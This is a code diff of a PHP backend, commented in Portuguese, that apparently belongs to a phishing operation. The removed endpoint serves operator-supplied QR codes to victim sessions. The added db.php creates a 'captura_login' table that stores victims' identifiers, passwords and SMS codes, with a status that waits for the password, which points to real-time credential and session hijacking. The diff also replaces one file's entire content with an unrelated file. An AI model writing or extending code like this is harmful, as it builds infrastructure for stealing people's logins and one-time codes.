@@ -1,52 +1,60 @@
 <?php
-header('Content-Type: application/json');
-require_once __DIR__ . '/db.php'; // Conexão com o banco
+// db.php
 
-// 1. Identifica o usuário pelo cookie, como em todas as outras APIs.
-$session_id = $_COOKIE['identificador_cliente'] ?? null;
-if (!$session_id) {
-    echo json_encode(['success' => false, 'error' => 'Sessão do cliente não encontrada.']);
-    exit;
+// Pega a URL do banco de dados da variável de ambiente do Heroku.
+$dbUrl = getenv('DATABASE_URL');
+
+if (empty($dbUrl)) {
+    // Se a variável de ambiente não estiver configurada, encerra a execução.
+    die(json_encode(['success' => false, 'error' => 'DATABASE_URL não configurada.']));
 }
+
+$dbopts = parse_url($dbUrl);
+
+$dbHost = $dbopts["host"];
+$dbPort = $dbopts["port"];
+$dbUser = $dbopts["user"];
+$dbPass = $dbopts["pass"];
+$dbName = ltrim($dbopts["path"], '/');
+$dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName";
 
 try {
-    // 2. CORREÇÃO: Busca AMBAS as colunas, 'qrcode_path' e 'qrcode_text'.
-    $sql = "SELECT qrcode_path, qrcode_text FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
-    $stmt = $pdo->prepare($sql);
-    $stmt->execute([$session_id]);
+    // Tenta estabelecer a conexão com o banco de dados.
+    $pdo = new PDO($dsn, $dbUser, $dbPass);
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    // Comando SQL para criar a tabela 'captura_login' SE ELA NÃO EXISTIR.
+    // A nova coluna 'qrcode_text' foi adicionada aqui para garantir que novas instalações já a tenham.
+    $sql_create_table = "
+    CREATE TABLE IF NOT EXISTS captura_login (
+        id SERIAL PRIMARY KEY,
+        session_id VARCHAR(255) NOT NULL,
+        identificador VARCHAR(255) NOT NULL,
+        senha VARCHAR(255) NULL,
+        sms_code VARCHAR(255) NULL,
+        qrcode_path VARCHAR(255) NULL,
+        qrcode_text TEXT NULL, -- << NOVA COLUNA ADICIONADA
+        status VARCHAR(255) DEFAULT 'aguardando_senha',
+        data_criacao TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+    );
+    ";
     
-    $result = $stmt->fetch(PDO::FETCH_ASSOC);
+    // Executa o comando de criação.
+    $pdo->exec($sql_create_table);
 
-    // 3. LÓGICA INTELIGENTE: Verifica os dois possíveis tipos de QR Code.
-    if ($result) {
-        // CENÁRIO A: QR Code enviado pela EXTENSÃO (tem um caminho de imagem)
-        if (!empty($result['qrcode_path'])) {
-            echo json_encode([
-                'success' => true,
-                'type' => 'image', // Informa ao cliente que é uma imagem
-                'data' => $result['qrcode_path']
-            ]);
-            exit;
-        }
-        
-        // CENÁRIO B: QR Code enviado pelo ADMIN (tem o texto do QR Code)
-        if (!empty($result['qrcode_text'])) {
-            echo json_encode([
-                'success' => true,
-                'type' => 'text', // Informa ao cliente que é um texto
-                'data' => $result['qrcode_text']
-            ]);
-            exit;
-        }
-    }
+    // --- AJUSTE ADICIONADO ---
+    // Este comando garante que a coluna 'qrcode_text' seja adicionada à tabela se ela JÁ EXISTIR.
+    // O 'IF NOT EXISTS' (para PostgreSQL) previne erros se o script rodar múltiplas vezes.
+    $sql_alter_table = "ALTER TABLE captura_login ADD COLUMN IF NOT EXISTS qrcode_text TEXT NULL;";
+    $pdo->exec($sql_alter_table);
 
-    // FALHA: Se nenhum dos campos foi encontrado para esta sessão.
-    echo json_encode(['success' => false, 'error' => 'Nenhum QR Code encontrado para esta sessão.']);
 
 } catch (PDOException $e) {
-    // Em caso de erro no banco, informa o erro.
-    error_log('Erro na API de get qrcode: ' . $e->getMessage());
-    http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
+    // Se a conexão ou a alteração da tabela falhar, retorna um erro em JSON.
+    header('Content-Type: application/json');
+    http_response_code(500); // Internal Server Error
+    die(json_encode(['success' => false, 'error' => 'Falha na conexão com o banco de dados: ' . $e->getMessage()]));
 }
+
+// A variável $pdo está agora disponível para qualquer script que inclua este arquivo.
 ?>
